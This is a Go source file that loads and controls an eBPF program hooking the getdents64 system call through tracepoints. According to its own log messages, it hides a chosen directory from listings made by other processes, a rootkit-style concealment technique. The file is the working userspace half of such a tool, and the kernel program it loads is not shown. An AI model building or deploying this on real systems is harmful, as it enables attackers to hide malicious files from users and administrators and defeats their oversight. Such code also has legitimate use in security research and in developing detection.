package main

import (
	"bytes"
	"encoding/binary"
	"encoding/hex"
	"errors"
	"fmt"
	"log"
	"os"
	"os/signal"

	"github.com/cilium/ebpf/link"
	"github.com/cilium/ebpf/perf"
	"github.com/cilium/ebpf/rlimit"
)

type bpfManager struct {
	sysEnter     link.Link
	sysExit      link.Link
	perfBuf      *perf.Reader
	bpfObjs      getdents64Objects
	perfBufEvent *getdents64RbEvent
	dirname      string
}

func BootstrapBPF(dirname string) (*bpfManager, error) {
	bpfManager := &bpfManager{}

	if err := removeRLimit(); err != nil {
		log.Fatal("Removing memlock:", err)
		return nil, err
	}

	if err := bpfManager.loadBPFPrograms(); err != nil {
		log.Fatal("Failed to load eBPF:", err)
		return nil, err
	}

	if err := bpfManager.storeDirnameInMap(dirname); err != nil {
		log.Fatalf("Fail to write in map %v", err)
		return nil, err
	}

	return bpfManager, nil
}

func removeRLimit() error {
	if err := rlimit.RemoveMemlock(); err != nil {
		log.Fatal("Removing memlock:", err)
		return err
	}
	return nil
}

func (bpfManager *bpfManager) Close() error {
	log.Println("Received signal, exiting..")
	if err := bpfManager.sysEnter.Close(); err != nil {
		return err
	}
	if err := bpfManager.sysExit.Close(); err != nil {
		return err
	}
	if err := bpfManager.perfBuf.Close(); err != nil {
		return err
	}
	if err := bpfManager.bpfObjs.Close(); err != nil {
		return err
	}
	return nil
}

func (bpfManager *bpfManager) loadBPFPrograms() error {
	var err error

	if err := loadGetdents64Objects(&bpfManager.bpfObjs, nil); err != nil {
		log.Fatal("Loading eBPF objects:", err)
		return err
	}

	if bpfManager.sysEnter, err = link.Tracepoint(
		"syscalls",
		"sys_enter_getdents64",
		bpfManager.bpfObjs.HandleGetdentsEnter,
		nil,
	); err != nil {
		log.Fatalf("Fail to open tracepoint sys_enter_getdents64: %s", err)
		return err
	}

	if bpfManager.sysExit, err = link.Tracepoint(
		"syscalls",
		"sys_exit_getdents64",
		bpfManager.bpfObjs.HandleGetdentsExit,
		nil,
	); err != nil {
		log.Fatalf("Fail to open tracepoint sys_exit_getdents64: %s", err)
		return err
	}

	if bpfManager.perfBuf, err = perf.NewReader(bpfManager.bpfObjs.Rb, os.Getpagesize()); err != nil {
		log.Fatalf("Opening ringbuf reader: %s", err)
		return err
	}

	log.Println("Waiting for events..")
	return nil
}

func (bpfManager *bpfManager) readPerfBuffer(perfBuffEvent *getdents64RbEvent) error {
	bpfManager.perfBufEvent = perfBuffEvent
	record, err := bpfManager.perfBuf.Read()
	if err != nil {
		if errors.Is(err, perf.ErrClosed) {
			return err
		}
		log.Printf("reading from reader: %s", err)
		return err
	}
	if err := bpfManager.parseRingbufEvent(record.RawSample); err != nil {
		log.Printf("parsing ringbuf event: %s", err)
		return err
	}
	return nil
}

func (bpfManager *bpfManager) parseRingbufEvent(rawSample []byte) error {
	return binary.Read(bytes.NewBuffer(rawSample), binary.LittleEndian, bpfManager.perfBufEvent)
}

func (bpfManager *bpfManager) storeDirnameInMap(dirname string) error {
	userDefinedData := NewUserspaceData(dirname)
	bpfManager.dirname = dirname
	return bpfManager.bpfObjs.MapStoreDirname.Put(int32(0), userDefinedData)
}

// Create a goroutine to wait until an Perf event occured and print it into the console
func (bpfManager *bpfManager) handlePerfEvent() {
	var perfBuffEvent getdents64RbEvent
	go func() {
		for {
			if err := bpfManager.readPerfBuffer(&perfBuffEvent); err != nil {
				return
			}

			if bpfManager.perfBufEvent.OverwriteSucced {
				byteBuffer, _ := hex.DecodeString(fmt.Sprintf("%x", bpfManager.perfBufEvent.Command))

				log.Printf("Hiding \"%v\" for process \"%s\" (pid: %d)\n",
					bpfManager.dirname,
					string(byteBuffer),
					bpfManager.perfBufEvent.Pid,
				)
			}
		}
	}()
}

func (bpfManager *bpfManager) waitUntilExitCall() {
	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, os.Kill)
	<-stop

	if err := bpfManager.Close(); err != nil {
		log.Fatalf("Error when closing bpfManager: %s", err)
	}
}
